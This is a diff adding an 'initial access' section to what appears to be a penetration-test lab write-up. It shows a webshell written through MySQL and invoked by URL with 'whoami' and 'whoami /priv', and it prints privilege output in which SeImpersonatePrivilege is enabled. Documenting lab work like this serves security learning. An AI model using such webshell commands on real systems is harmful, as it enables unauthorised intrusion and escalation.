@@ -1126,3 +1126,29 @@ phpMyAdmin은 로그인 시 세션+CSRF 토큰 검증을 하므로 Hydra처럼 �
 ![phpmyadmin](image_3.png)
 
 ![login success](image_4.png)
+
+# success initial access
+
+- MYSQL webshell output write
+  ![web_shell_output](image_6.png)
+
+http://192.168.58.189:8080/shell.php?cmd=whoami
+
+![output](image_7.png)
+
+nt authority\local service
+
+http://192.168.58.189:8080/shell.php?cmd=whoami%20/priv
+
+![](image_8.png)
+
+PRIVILEGES INFORMATION ---------------------- Privilege Name Description State ============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process level token Disabled
+SeIncreaseQuotaPrivilege Adjust memory quotas for a process Disabled
+SeSystemtimePrivilege Change the system time Disabled
+SeAuditPrivilege Generate security audits Disabled
+SeChangeNotifyPrivilege Bypass traverse checking Enabled
+SeImpersonatePrivilege Impersonate a client after authentication Enabled
+SeCreateGlobalPrivilege Create global objects Enabled
+SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
+SeTimeZonePrivilege Change the time zone Disabled
